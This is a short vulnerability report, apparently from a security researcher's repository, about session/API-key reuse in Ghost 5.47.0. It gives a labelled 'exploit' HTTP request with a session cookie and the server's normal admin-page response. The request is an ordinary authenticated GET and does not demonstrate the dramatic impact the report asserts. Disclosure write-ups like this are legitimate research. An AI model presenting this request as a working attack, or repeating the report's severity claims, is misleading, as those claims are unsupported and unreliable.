## [Ghost-5.47.0-SameSite-API-key-multiple-connection Vulnerability](https://github.com/TryGhost/Ghost/releases/tag/v5.47.0)

## [Vendor](https://account.ghost.org/signup)

![](https://github.com/nu11secur1ty/CVE-nu11secur1ty/blob/main/vendors/ghost.org/Ghost-5.47.0/docs/Screenshot%202023-05-11%20161708.png)

## Description:
The attacker can create a lot of sessions at the same time by using only one API key.
This could be very dangerous if the attacker wants to attack this system multiply with other supporters.
They can connect with him at the same time and when this is happen this can be the end of this system. 
The first attacker can create an account for the next attacker, nice a. Then this first attacker will send the already created API key from the malicious account to the second attacker for authentication, and this could be the end for this server! Or the second attacker can get a lot of information dumping, destroying the system and etc.
NOTE: Every session must have - generated its own key!

STATUS: HIGH Vulnerability

[+]Exploit:
```GET
GET /ghost/ HTTP/1.1
Host: 192.168.100.45:2368
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.138 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: ghost-admin-api-session=s%3AS8maPrPDK1LW0b-mK_qDdtA6wulSCH-Z.ZB5fcfiUgpFHH%2FSlRyLCUphhRTmDIRSOOfhXAZO1zrA
Connection: close

```
[+]Response:
```HTTP
HTTP/1.1 200 OK
X-Powered-By: Express
Cache-Control: no-cache, private, no-store, must-revalidate, max-stale=0, post-check=0, pre-check=0
ETag: 7e479bd8fb8123a19f2c17384ad6f72d
X-Frame-Options: sameorigin
Accept-Ranges: bytes
Last-Modified: Sat, 26 Oct 1985 08:15:00 GMT
Content-Type: text/html; charset=UTF-8
Vary: Accept-Encoding
Date: Thu, 11 May 2023 12:42:41 GMT
Connection: close
Content-Length: 3730

<!doctype html>
<!--[if (IE 8)&!(IEMobile)]><html class="no-js lt-ie9" lang="en"><![endif]-->
<!--[if (gte IE 9)| IEMobile |!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
<head>
    <meta http-equiv="Content-Type" content="text/html" charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />

    <title>Ghost Admin</title>

    
<meta name="ghost-admin/config/environment" content="%7B%22modulePrefix%22%3A%22ghost-admin%22%2C%22environment%22%3A%22production%22%2C%22rootURL%22%3A%22%22%2C%22locationType%22%3A%22trailing-hash%22%2C%22EmberENV%22%3A%7B%22FEATURES%22%3A%7B%7D%2C%22EXTEND_PROTOTYPES%22%3A%7B%22Date%22%3Afalse%2C%22Array%22%3Atrue%2C%22String%22%3Atrue%2C%22Function%22%3Afalse%7D%2C%22_APPLICATION_TEMPLATE_WRAPPER%22%3Afalse%2C%22_JQUERY_INTEGRATION%22%3Atrue%2C%22_TEMPLATE_ONLY_GLIMMER_COMPONENTS%22%3Atrue%7D%2C%22APP%22%3A%7B%22version%22%3A%225.47%22%2C%22name%22%3A%22ghost-admin%22%7D%2C%22ember-simple-auth%22%3A%7B%7D%2C%22ember-websockets%22%3A%7B%22socketIO%22%3Atrue%7D%2C%22%40sentry%2Fember%22%3A%7B%22disablePerformance%22%3Atrue%2C%22sentry%22%3A%7B%7D%7D%2C%22ember-cli-mirage%22%3A%7B%22usingProxy%22%3Afalse%2C%22useDefaultPassthroughs%22%3Atrue%7D%2C%22exportApplicationGlobal%22%3Afalse%2C%22ember-load%22%3A%7B%22loadingIndicatorClass%22%3A%22ember-load-indicator%22%7D%7D" />
```

## Reproduce:
[href](https://github.com/nu11secur1ty/CVE-nu11secur1ty/tree/main/vendors/ghost.org/Ghost-5.47.0)

## Proof and Exploit:
[href](https://www.nu11secur1ty.com/2023/05/ghost-5470-samesite-api-key-multiple.html)

## Time spend:
03:27:00
